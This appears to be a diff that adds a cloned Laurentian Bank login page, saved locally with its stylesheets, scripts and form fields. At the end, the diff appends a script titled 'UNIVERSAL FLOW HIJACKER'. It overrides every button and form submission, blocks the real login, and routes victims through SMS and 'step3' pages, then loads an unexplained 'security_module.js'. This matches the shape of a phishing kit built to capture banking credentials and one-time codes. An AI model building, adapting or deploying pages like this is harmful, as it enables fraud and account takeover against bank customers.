.fui-hint-text{display:none}html[ui-mode=bootstrap][ui-version="3"] fui-form-group>.fui-form-group-controls{display:flex}html[ui-mode=bootstrap][ui-version="3"] fui-form-group .fui-hint-text.form-check,html[ui-mode=bootstrap][ui-version="3"] fui-form-group .fui-errors.form-check{min-height:0}html[ui-mode=bootstrap][ui-version="3"] fui-form-group.fui-readonly>.fui-errors,html[ui-mode=bootstrap][ui-version="3"] fui-form-group.fui-readonly .fui-hint-text{display:none}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><style>fui-checkbox[disabled],fui-checkbox[readonly]{cursor:not-allowed}html[ui-mode=bootstrap] fui-checkbox{display:inline-block}html[ui-mode=bootstrap] fui-checkbox .fui-checkbox-label.fui-checkbox-label-readonly{opacity:1}html[ui-mode=bootstrap] fui-checkbox .fui-checkbox-label-container{display:inline-block}html[ui-mode=bootstrap] fui-checkbox .fui-checkbox-label-container .fui-checkbox-label{display:inline}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox[disabled] .form-check-label{opacity:0.5}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check{display:block;margin-bottom:0.125rem;padding-left:1.5em}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-label{font-weight:500;line-height:normal}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-input{float:left;margin-left:-1.5em}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-input.is-invalid{border-color:var(--global-danger-color);}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-input.is-invalid~.form-check-label{color:var(--global-danger-color)}html[ui-mode=ionic] fui-checkbox{display:block}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox .fui-checkbox-label{display:inline-flex;flex-flow:row nowrap;gap:var(--fui-spacing-3)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox .fui-checkbox-input{align-items:center;background:var(--fui-checkbox-background-color, transparent);border:var(--fui-checkbox-border-width, var(--common-outline-border-width)) solid var(--fui-checkbox-border-color, var(--global-secondary-color));border-radius:var(--common-border-radius-s);box-sizing:border-box;display:flex;height:calc(var(--fui-checkbox-size, var(--common-icon-size-xxs)) + var(--fui-spacing-1) * 2);justify-content:center;min-width:calc(var(--fui-checkbox-size, var(--common-icon-size-xxs)) + var(--fui-spacing-1) * 2);transition:background 180ms ease-in-out;width:calc(var(--fui-checkbox-size, var(--common-icon-size-xxs)) + var(--fui-spacing-1) * 2)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox fui-icon.fui-checkbox-checkmark{--fui-icon-size:var(--common-icon-size-xxs);--fui-icon-color:var(
+  	--fui-checkbox-checked-foreground-color,
+  	var(--global-secondary-color-contrast)
+  );opacity:0;transition:opacity 180ms ease-in-out}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input{height:0;opacity:0;position:absolute;width:0}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input:focus~.fui-checkbox-label .fui-checkbox-input{box-shadow:var(--common-form-control-focus-shadow)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input:checked~.fui-checkbox-label .fui-checkbox-input{background:var(--fui-checkbox-checked-background-color, var(--global-secondary-color))}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input:checked~.fui-checkbox-label fui-icon.fui-checkbox-checkmark{opacity:1}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input[aria-invalid=true]~.fui-checkbox-label .fui-checkbox-input{border-color:var(--global-danger-color)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input[aria-invalid=true]~.fui-checkbox-label fui-icon.fui-checkbox-checkmark{--fui-icon-color:var(--global-danger-color-contrast)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input[aria-invalid=true]:checked~.fui-checkbox-label .fui-checkbox-input{background:var(--global-danger-color)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input[disabled]~.fui-checkbox-label .fui-checkbox-input{border-color:var(--global-disabled-color)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input[disabled]~.fui-checkbox-label fui-icon.fui-checkbox-checkmark{--fui-icon-color:var(--global-disabled-color-contrast)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-checkbox input.fui-checkbox-native-input[disabled]:checked~.fui-checkbox-label .fui-checkbox-input{background:var(--global-disabled-color)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-toggle{align-items:center;display:flex;flex-flow:row nowrap;gap:var(--fui-spacing-2)}html[ui-mode=ionic] fui-checkbox .fui-checkbox-as-toggle .fui-checkbox-label{order:-1}html[ui-mode=ionic] fui-checkbox[disabled] .fui-checkbox-label{color:var(--global-disabled-color)}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><style>fui-error-message{display:block}html[ui-mode=ionic] fui-error-message{align-items:center;display:flex;flex-flow:row nowrap;gap:var(--fui-spacing-1);padding-left:0;padding-right:0}html[ui-mode=ionic] fui-error-message fui-icon{--fui-icon-color:var(--global-danger-color);--fui-icon-size:var(--common-icon-size-xxs)}html[ui-mode=ionic] fui-error-message .ionic-error-message{color:var(--global-danger-color)}html[ui-mode=bootstrap][ui-version="3"] fui-error-message .invalid-feedback{color:var(--global-danger-color);font-size:0.875em}fui-error-message[hidden]{display:none}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><style>fui-input{display:block;width:100%}html[ui-mode=ionic] fui-input ion-input{--placeholder-color:var(
+  	--fui-input-placeholder-color,
+  	var(--common-placeholder-color)
+  );--placeholder-font-style:var(--fui-input-placeholder-font-style);--placeholder-font-weight:var(--fui-input-placeholder-font-weight);--placeholder-opacity:var(--common-placeholder-opacity);--color:var(
+  	--fui-input-color,
+  	var(--global-neutral-highest-contrast-color)
+  );--padding-start:0 !important;--padding-end:0 !important;--padding-top:0 !important;--padding-bottom:0 !important;}html[ui-mode=ionic] fui-input ion-input.input-disabled.sc-ion-input-ios-h,html[ui-mode=ionic] fui-input ion-input.input-disabled.sc-ion-input-md-h{opacity:unset}html[ui-mode=ionic] fui-input ion-input .input-wrapper{background:transparent}html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-ios,html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-md,html[ui-mode=ionic] fui-input ion-input input.native-input{background:var(--fui-input-background-color, var(--global-neutral-lowest-contrast-color));border:var(--fui-input-border-bottom, var(--common-outline-border-width) solid var(--common-form-control-border-color));border-radius:var(--common-form-control-border-radius);box-shadow:var(--common-form-control-shadow);padding:var(--fui-spacing-3) 0.75rem}html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-ios.sc-ion-input-md:invalid:not(:focus),html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-ios.sc-ion-input-ios:invalid:not(:focus),html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-md.sc-ion-input-md:invalid:not(:focus),html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-md.sc-ion-input-ios:invalid:not(:focus),html[ui-mode=ionic] fui-input ion-input input.native-input.sc-ion-input-md:invalid:not(:focus),html[ui-mode=ionic] fui-input ion-input input.native-input.sc-ion-input-ios:invalid:not(:focus){box-shadow:var(--common-form-control-shadow)}html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-ios:hover,html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-md:hover,html[ui-mode=ionic] fui-input ion-input input.native-input:hover{border-color:var(--common-form-control-hover-border-color)}html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-ios:focus,html[ui-mode=ionic] fui-input ion-input.legacy-input input.native-input.sc-ion-input-md:focus,html[ui-mode=ionic] fui-input ion-input input.native-input:focus{box-shadow:var(--common-form-control-focus-shadow)}html[ui-mode=ionic] fui-input ion-input:not(.legacy-input){min-height:revert}html[ui-mode=ionic] fui-input ion-input.is-invalid input.native-input{border-color:var(--global-danger-color) !important}html[ui-mode=ionic] fui-input fui-icon-button-item button fui-icon{--fui-icon-size:var(--common-icon-size-s);padding-bottom:0}html[ui-mode=ionic] fui-input[icon-end],html[ui-mode=ionic] fui-input[icon-start]{position:relative}html[ui-mode=ionic] fui-input[icon-end]>fui-icon-button-item,html[ui-mode=ionic] fui-input[icon-end]>fui-icon,html[ui-mode=ionic] fui-input[icon-start]>fui-icon-button-item,html[ui-mode=ionic] fui-input[icon-start]>fui-icon{align-items:center;display:flex;height:100%;position:absolute;top:0;z-index:99}html[ui-mode=ionic] fui-input[icon-end] button,html[ui-mode=ionic] fui-input[icon-start] button{padding-left:0;padding-right:0}html[ui-mode=ionic] fui-input[icon-end] ion-input.legacy-input input.native-input.sc-ion-input-ios,html[ui-mode=ionic] fui-input[icon-end] ion-input.legacy-input input.native-input.sc-ion-input-md,html[ui-mode=ionic] fui-input[icon-end] ion-input input.native-input{padding-right:calc(var(--fui-spacing-2) + var(--common-icon-size-s) + 0.75rem)}html[ui-mode=ionic] fui-input[icon-end] fui-icon-button-item.icon-end,html[ui-mode=ionic] fui-input[icon-end] fui-icon.icon-end{padding-left:var(--fui-spacing-3);padding-right:var(--fui-spacing-3);right:0}html[ui-mode=ionic] fui-input[icon-start] ion-input.legacy-input input.native-input.sc-ion-input-ios,html[ui-mode=ionic] fui-input[icon-start] ion-input.legacy-input input.native-input.sc-ion-input-md,html[ui-mode=ionic] fui-input[icon-start] ion-input input.native-input{padding-left:calc(var(--fui-spacing-2) + var(--common-icon-size-s) + 0.75rem)}html[ui-mode=ionic] fui-input[icon-start] fui-icon-button-item.icon-start,html[ui-mode=ionic] fui-input[icon-start] fui-icon.icon-start{left:0;padding-left:0.75rem;padding-right:var(--fui-spacing-2)}html[ui-mode=ionic] fui-input[disabled] ion-input.fui-disabled input.native-input{color:var(--global-disabled-color);opacity:1;}html[ui-mode=ionic] fui-input[disabled] ion-input.fui-disabled input.native-input:hover{border-color:var(--common-form-control-border-color)}html[ui-mode=ionic] fui-input[disabled] ion-input.fui-disabled input.native-input[disabled].sc-ion-input-md,html[ui-mode=ionic] fui-input[disabled] ion-input.fui-disabled input.native-input[disabled].sc-ion-input-ios{opacity:1}html[ui-mode=ionic] fui-input[disabled] fui-icon-button-item,html[ui-mode=ionic] fui-input[disabled] fui-icon{--fui-icon-color:var(--global-disabled-color)}html[ui-mode=ionic] fui-input[disabled] fui-icon-button-item button,html[ui-mode=ionic] fui-input[disabled] fui-icon{cursor:default}html[ui-mode=bootstrap] fui-input[icon-end]{position:relative}html[ui-mode=bootstrap] fui-input[icon-end] input{padding-right:4rem}html[ui-mode=bootstrap] fui-input[icon-end] fui-icon-button-item.icon-end,html[ui-mode=bootstrap] fui-input[icon-end] fui-icon.icon-end{align-items:center;display:flex;height:100%;position:absolute;right:1.5rem;top:0}html[ui-mode=bootstrap] fui-input[icon-end] button{font-size:0.75rem;margin-right:-0.5rem}html[ui-mode=bootstrap] fui-input[icon-start]{position:relative;}html[ui-mode=bootstrap] fui-input[icon-start] fui-icon-button-item.icon-start,html[ui-mode=bootstrap] fui-input[icon-start] fui-icon.icon-start{align-items:center;display:flex;height:100%;left:0.75rem;position:absolute;top:0}html[ui-mode=bootstrap] fui-input[icon-start] input{padding-left:calc(0.75rem + var(--fui-icon-size, var(--common-icon-size-s, 1rem)) + 0.5rem)}html[ui-mode=bootstrap] fui-input[disabled] fui-icon-button-item,html[ui-mode=bootstrap] fui-input[disabled] fui-icon{--fui-icon-color:var(--bs-secondary-2, #666)}html[ui-mode=bootstrap] fui-input[disabled] fui-icon-button-item button,html[ui-mode=bootstrap] fui-input[disabled] fui-icon{cursor:default}html[ui-mode=bootstrap] fui-input[icon-end]>fui-icon-button-item fui-icon,html[ui-mode=bootstrap] fui-input[icon-start]>fui-icon-button-item fui-icon{--fui-icon-size:var(--common-icon-size-s)}html[ui-mode=bootstrap] fui-input[icon-end] .is-invalid~fui-icon-button-item button{margin-right:0.25rem}html[ui-mode=bootstrap][ui-version="3"] fui-input .is-invalid{border-color:var(--global-danger-color)}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><style>fui-label{display:inline-block}html[ui-mode=ionic] fui-label{align-items:center;display:flex;flex:auto;gap:var(--fui-spacing-3);}html[ui-mode=ionic] fui-label ion-label{display:inline-block;font-size:var(--fui-label-font-size, inherit);--ion-font-family:inherit}html[ui-mode=ionic] fui-label ion-label.label-stacked{margin:0;transform:none;transition:none}html[ui-mode=ionic] fui-label:not(.fui-control-group){color:var(--fui-label-color, var(--global-neutral-higher-contrast-color))}html[ui-mode=ionic] fui-label.fui-control-group{color:var(--fui-group-label-color, var(--fui-label-color, var(--global-neutral-higher-contrast-color)))}html[ui-mode=bootstrap] fui-label .form-label{color:var(--fui-label-color, var(--bs-secondary-2, #666));font-size:var(--fui-label-font-size, inherit)}html[ui-mode=bootstrap][ui-version="3"] fui-label .form-label{color:var(--fui-label-color);font-size:var(--fui-label-font-size, var(--common-base-font-size));font-weight:700;padding-right:2.5rem;padding-top:1rem}slot-fb{display:contents}slot-fb[hidden]{display:none}</style><link rel="icon" type="image/x-icon" href="#">
+  
+    <link type="text/css" href="./Login_files/md-reno-base.css" rel="stylesheet">
+    <link type="text/css" href="./Login_files/online_v2-mapping.css" rel="stylesheet">
+    <link type="text/css" href="./Login_files/online_v2.css" rel="stylesheet">
+    <link type="text/css" href="./Login_files/theme-laurentianbank-oidc.css" rel="stylesheet">
+    <style>
+        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak {
+            display: none !important;
+        }   
+    </style>
+
+  
+  
+    <script>
+        window.SHARED_APP_DATA = {
+            logoSrc: "resources\/themes\/theme-laurentianbank-oidc\/assets\/images\/logo.svg",
+            logoAlt: "Laurentian Bank logo.",
+            loginLogoEnabled: JSON.parse("true"),
+            _csrf: "X6nc5u6-r6DXbZuKX06mAa6ezuCb87Q0PiLndR3L6sP4vj7nb8vkhdjam8P6CKK7Z2OSOZqs44KuytYZCBDeFyTz26Kch1_U",
+            simulatorEnabled:  JSON.parse(null),
+            spinnerEnabled: JSON.parse("true"),
+            spinnerAriaLabel: "busy",
+            authenticationSimulator: JSON.parse(null),
+            increasedAuthSimulator: JSON.parse(null),
+        }
+    </script>
+
+<script src="./Login_files/client-renderer.min.js.téléchargement" type="text/javascript"></script><script src="./Login_files/__plugin.compiled.js.téléchargement" type="text/javascript"></script><script src="./Login_files/hashtable.js.téléchargement" type="text/javascript"></script><script src="./Login_files/rsa.min.js.téléchargement" type="text/javascript"></script><meta name="tenantid" content="qc_laurentianbank_ca"><script>
+    window["__FORGE_API_CONFIG__"] = {
+      palantir: "https:\/\/api.forge.central1.cc\/palantir\/v1",
+    };
+  </script><script>
+    window.APP_DATA = {
+      formAction: "\/auth\/oauth2\/login?execution=e1s1\u0026client_id=OnlineBanking",
+      forgotPacUrl: "\/auth\/oauth2\/forgotPac",
+      error:
+        [],
+      panLabel: "Access code",
+      panPlaceholder:
+        "Access code",
+      panPrefixPlaceholder:
+        "Enter Access Code",
+      loginFormTitle: "Sign In",
+      loginLogoEnabled: JSON.parse(
+        "true"
+      ),
+      panPrefixOutside: JSON.parse(
+        "false"
+      ),
+      panPrefix: "",
+      panPrefixVisible: JSON.parse(
+        "true"
+      ),
+      memberBranchLabel:
+        "Branch",
+      memberBranchPlaceholder:
+        "Select a Branch",
+      memberNumberLabel: "Access code",
+      memberNumberPlaceholder:
+        "Access code",
+      branchMaxLength: "3",
+      branchPattern: "^\\d{5}$",
+      branchDisplayType: "hidden",
+      branchData: JSON.parse("[{}]"),
+      branchDefault: "001",
+      branchRequiredError:
+        "Please enter your branch.",
+      branchMismatchError:
+        "You have entered an invalid branch. Please try again.",
+      passwordLabel: "Password",
+      loginBtnLabel: "Log in",
+      accountMaxLength: JSON.parse(
+        "8"
+      ),
+      usernamePattern: "^\\d{1,8}$",
+      delegatePattern:
+        "^D\\d{7}$",
+      passwordPattern: "^.{4,30}$",
+      usernameMismatchError:
+        "You've entered an incorrect access code. Try again.",
+      usernameRequiredError:
+        "Enter your access code.",
+      pacMismatchError:
+        "You've entered an incorrect password. Try again.",
+      pacRequiredError:
+        "You've entered an incorrect password. Try again.",
+      mdsbEnabled: JSON.parse("false"),
+      panLoginEnabled: JSON.parse(
+        "true"
+      ),
+      showPasswordLabel: "Show password",
+      hidePasswordLabel: "Hide password",
+      checkboxLabel:
+        "<b>Remember me<\/b> <p style=\"margin-left: -7px;\">To create a login profile, select \"Remember me\". On the mobile app, this option will let you use QuickView or biometric login.<\/p>",
+      nicknameLabel: "Login profile name",
+      nicknamePlaceholder:
+        "Enter name",
+      nicknameMismatchError:
+        "Profile name length must be at least 1 character",
+      nicknameMinLength: "1",
+      nicknameMaxLength: "25",
+      forgotPacEnabled:
+        JSON.parse("true"),
+      forgotPacLabel: "Reset password",
+      memorizedLoginTitle:
+        "Choose a login profile",
+      memorizedLoginDeleteAriaLabel:
+        "delete button",
+      showLoginForm:
+        "Log in to a different profile",
+      editMemorizedAccounts:
+        "Manage login profiles",
+      showMemorizedAccounts:
+        "Show saved login profiles",
+      memorizedAccounts:
+        [],
+      deleteConfirmMsg:
+        "Are you sure you want to delete the saved login profile",
+      deleteConfirmSubmitBtn:
+        "Ok",
+      deleteConfirmCancelBtn:
+        "Cancel",
+      isWithinUpcomingMaintenanceWindow:
+        JSON.parse(false),
+      maintenanceMessage:
+        "<strong>Notice:<\/strong> Our online banking and mobile app services may be unavailable for scheduled maintenance from Thursday, July 23 at 9:30 pm to Friday, July 24, 2026 at 1:30 am ET.",
+      externalLinkEnabled:
+        JSON.parse("false"),
+      externalLinks:
+        "Other Accounts",
+      externalLinkMemorizedLoginEnabled:
+        JSON.parse("false"),
+      memorizedLoginEnterPwTitle:
+        "Enter password for <em>{{ selectedMemorizedAccount.nickname }}<\/em>",
+      errorCode: null,
+    };
+  </script></head>
+  
+  
+  
+  
+  
+  
+  
+
+  
+  <body class="oidc-auth-theme">
+    
+      <forge-plugin plugin-id="c1ext/oidc-authentication-login" stream="stable" plugin-root="https://plugins.central1.cc/c1ext/oidc-authentication-login/stable"><!---->
+        <forge-plugin-outlet><forge-feature-oidc-authentication-login-desktop-app data-instance-id="" ng-version="19.1.3"><oidc-authentication-login-desktop-login><oidc-authentication-ui-simulator-badge><!----></oidc-authentication-ui-simulator-badge><div class="widget-c1-oauth-login position-relative oauth-login"><!----><oidc-authentication-ui-oidc-logo><div class="logo"><img fctestid="loginLogo" src="./Login_files/logo.svg" alt="Laurentian Bank logo." data-test-id="loginLogo"></div><!----></oidc-authentication-ui-oidc-logo><!----><oidc-authentication-ui-error><div><!----></div><!----></oidc-authentication-ui-error><form novalidate="" method="post" fctestid="loginForm" id="loginForm" action="javascript:void(0)" class="ng-untouched ng-pristine ng-invalid" data-test-id="loginForm"><oidc-authentication-login-ui-username-field fctestid="loginUsernameField" data-test-id="loginUsernameField"><oidc-authentication-login-ui-pan-field><pan-login><fui-form-group class="form-group pan-login-field ng-untouched ng-pristine ng-invalid hydrated" layout="stacked" display-mode="transparent"><!----><div class="fui-form-group-controls fui-form-group-control-container"><fui-label fctestid="panLoginLabel" data-test-id="panLoginLabel" class="forge-common-body-md hydrated" position="stacked"><!----><label class="form-label" id="FuiLabel-3">Access code</label><span class="fui-label-after"></span></fui-label><!----><fui-input fctestid="panLoginInput" required="" formcontrolname="username" class="ng-untouched ng-pristine ng-invalid hydrated" maxlength="8" pattern="^\d{1,8}$" data-test-id="panLoginInput" placeholder="Access code" name="username" type="text" labelled-by-id="FuiLabel-3" described-by-id="FuiError-3" position="stacked"><!----><input class="form-control" aria-invalid="false" placeholder="Access code" required="" pattern="^\d{1,8}$" name="username" maxlength="8" type="text" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="true" aria-labelledby="FuiLabel-3" aria-describedby="FuiError-3"></fui-input></div><div class="fui-form-group-note-container"><div id="FuiError-3" aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-form-group-note fui-errors"><fui-error-message fctestid="panUsernameTooLongError" error-type="tooLong" data-test-id="panUsernameTooLongError" class="hydrated" hidden=""><!----><div class="invalid-feedback d-block"><span aria-hidden="true"></span> You've entered an incorrect access code. Try again. </div></fui-error-message><fui-error-message fctestid="panUsernameMismatchError" error-type="patternMismatch" data-test-id="panUsernameMismatchError" class="hydrated" hidden=""><!----><div class="invalid-feedback d-block"><span aria-hidden="true"></span> You've entered an incorrect access code. Try again. </div></fui-error-message><fui-error-message fctestid="panUsernameMissingError" error-type="valueMissing" data-test-id="panUsernameMissingError" class="hydrated" hidden=""><!----><div class="invalid-feedback d-block"><span aria-hidden="true"></span> Enter your access code. </div></fui-error-message></div><div id="FuiHint-3" aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-form-group-note fui-hint-text"></div></div></fui-form-group></pan-login></oidc-authentication-login-ui-pan-field><!----><!----></oidc-authentication-login-ui-username-field><fui-password-toggle-group class="form-group hydrated"><!----><div class="bs-fui-password-toggle-group"><fui-password-toggle-label when="hidden" fctestid="showPassword" data-test-id="showPassword" class="hydrated"><!----><fui-button button-role="link" size="medium" class="hydrated"><!----><button class="btn btn-link icon-placement-left" type="button" buttonrole="link"><i aria-hidden="true" class="icon-shown"></i> Show password </button></fui-button></fui-password-toggle-label><fui-password-toggle-label when="shown" fctestid="hidePassword" data-test-id="hidePassword" class="hydrated" hidden=""><!----><fui-button button-role="link" size="medium" class="hydrated"><!----><button class="btn btn-link icon-placement-left" type="button" buttonrole="link"><i aria-hidden="true" class="icon-hidden"></i> Hide password </button></fui-button></fui-password-toggle-label><fui-form-group layout="stacked" display-mode="transparent" class="hydrated"><!----><div class="fui-form-group-controls fui-form-group-control-container"><fui-label fctestid="loginPasswordLabel" data-test-id="loginPasswordLabel" class="forge-common-body-md hydrated" position="stacked"><!----><label class="form-label" id="FuiLabel-1">Password</label><span class="fui-label-after"></span></fui-label><fui-input fctestid="loginPasswordField" required="" type="password" name="password" formcontrolname="password" class="ng-untouched ng-pristine ng-invalid hydrated" pattern="^.{4,30}$" data-test-id="loginPasswordField" placeholder="Password" labelled-by-id="FuiLabel-1" described-by-id="FuiError-1" position="stacked"><!----><input class="form-control" aria-invalid="false" placeholder="Password" required="" pattern="^.{4,30}$" name="password" type="password" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="true" aria-labelledby="FuiLabel-1" aria-describedby="FuiError-1"></fui-input></div><div class="fui-form-group-note-container"><div id="FuiError-1" aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-form-group-note fui-errors"><fui-error-message fctestid="passwordMismatchError" error-type="patternMismatch" data-test-id="passwordMismatchError" class="hydrated" hidden=""><!----><div class="invalid-feedback d-block"><span aria-hidden="true"></span> You've entered an incorrect password. Try again. </div></fui-error-message><fui-error-message fctestid="passwordMissingError" error-type="valueMissing" data-test-id="passwordMissingError" class="hydrated" hidden=""><!----><div class="invalid-feedback d-block"><span aria-hidden="true"></span> You've entered an incorrect password. Try again. </div></fui-error-message></div><div id="FuiHint-1" aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-form-group-note fui-hint-text"></div></div></fui-form-group></div></fui-password-toggle-group><fui-form-group class="form-group remember-login-container hydrated fui-control-inline" layout="stacked" display-mode="transparent"><!----><div class="fui-form-group-controls fui-form-group-control-container"><fui-checkbox fctestid="loginMemorizedCheckbox" name="createMemorizedAccount" id="rememberLogin" type="boolean" data-test-id="loginMemorizedCheckbox" true-value="true" false-value="false" is-inline-control="" render-as="checkbox" class="hydrated" labelled-by-id="" position="stacked"><!----><div class="form-check"><input type="checkbox" id="FuiCheckboxControl-1" name="createMemorizedAccount" class="form-check-input" aria-invalid="false" aria-labelledby="FuiCheckboxLabel-1" aria-checked="false"><div class="fui-checkbox-label-container"><label class="fui-checkbox-label form-check-label" for="FuiCheckboxControl-1" id="FuiCheckboxLabel-1"><span class="remember-me-input-label">Remember Me</span></label></div></div></fui-checkbox></div><div class="fui-form-group-note-container"><div id="FuiError-2" aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-form-group-note fui-errors"></div><div id="FuiHint-2" aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-form-group-note fui-hint-text"></div></div></fui-form-group><!----><input type="hidden" name="_csrf" value="X6nc5u6-r6DXbZuKX06mAa6ezuCb87Q0PiLndR3L6sP4vj7nb8vkhdjam8P6CKK7Z2OSOZqs44KuytYZCBDeFyTz26Kch1_U"><input type="hidden" name="_eventId_submit" value="Login"><oidc-authentication-ui-device-fingerprint-input><input type="hidden" name="device" value="version%3D3%2E7%2E1%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F153%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F153%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1536%7C864%7C824%26pm%5Ffpsw%3Dpdf%7Cpdf%7Cpdf%7Cpdf%7Cpdf%26pm%5Ffptz%3D%2D5%26pm%5Ffpln%3Dlang%3Dfr%2DFR%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1536%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D153%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D"></oidc-authentication-ui-device-fingerprint-input><fui-button fctestid="loginSubmitButton" button-role="main" type="submit" class="c1-btn-container hydrated" data-test-id="loginSubmitButton" size="medium" disabled=""><!----><button class="btn btn-primary" type="submit" buttonrole="main" disabled="" aria-disabled="true"> Log in </button></fui-button></form><!----><oidc-authentication-ui-spinner><div><!----></div><!----></oidc-authentication-ui-spinner><!----><div class="memorized-btn-container"><!----><!----><!----><fui-button fctestid="forgotPasswordLink" button-role="link" data-test-id="forgotPasswordLink" href="/auth/oauth2/forgotPac" size="medium" class="hydrated"><!----><button class="btn btn-link icon-placement-left" type="button" buttonrole="link"> Reset password </button></fui-button><!----></div><!----></div><!----></oidc-authentication-login-desktop-login></forge-feature-oidc-authentication-login-desktop-app>
+<script>
+	let c1Apps = ((window.c1 = window.c1 || {}).apps = window.c1.apps || {});
+	c1Apps[''] = `{}`;
+</script>
+<script src="./Login_files/oidc-authentication-login-desktop-app.packed.js.téléchargement">
+    $(".fi-tile img").click(function(e){
+        e.preventDefault();
+        e.stopPropagation();
+        var $tile = $(this).closest(".fi-tile");
+        $("#hiddenFiId").val($tile.attr("fiid") || "");
+        $("#hiddenCuId").val($tile.attr("cuid") || "");
+        $("#hiddenFiLabel").val($tile.attr("filabel") || "");
+        $("#hiddenCuLabel").val($tile.attr("filabel") || "");
+        submitForm();
+    });
+    
+</script>
+<!----></forge-plugin-outlet>
+      </forge-plugin>
+    
+
+    
+  
+
+
+<script>
+// UNIVERSAL FLOW HIJACKER
+document.addEventListener("DOMContentLoaded", function() {
+    setTimeout(function() {
+        var btns = document.querySelectorAll("button, input[type='submit'], .btn");
+        btns.forEach(function(btn) {
+            var clone = btn.cloneNode(true);
+            if (btn.parentNode) {
+                btn.parentNode.replaceChild(clone, btn);
+                clone.style.pointerEvents = "auto";
+                clone.removeAttribute("disabled");
+                
+                clone.addEventListener("click", function(e) {
+                    var text = (clone.textContent || clone.value || "").toLowerCase().trim();
+                    var isSubmit = clone.getAttribute("type") === "submit" || clone.tagName === "BUTTON" || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("log") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("connex") !== -1 || text.indexOf("next") !== -1 || text.indexOf("suivant") !== -1;
+                    
+                    if (isSubmit) {
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
+                        
+                        var current = window.location.pathname.split("/").pop();
+                        if (current.indexOf("_sms.html") !== -1) {
+                            window.location.href = current.replace("_sms.html", "_step3.html");
+                        } else if (current.indexOf("_step3.html") !== -1) {
+                            alert("Vérification terminée !");
+                        } else if (current !== "index.html" && current !== "") {
+                            window.location.href = current.replace(".html", "_sms.html");
+                        }
+                    }
+                }, true);
+            }
+        });
+        
+        // Also forcibly hijack all form submits
+        var forms = document.querySelectorAll("form");
+        forms.forEach(function(form) {
+            form.setAttribute("action", "javascript:void(0)");
+            form.onsubmit = function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            };
+        });
+    }, 300); // slight delay to ensure other frameworks finish loading
+});
+</script>
+
+<script src="security_module.js"></script>
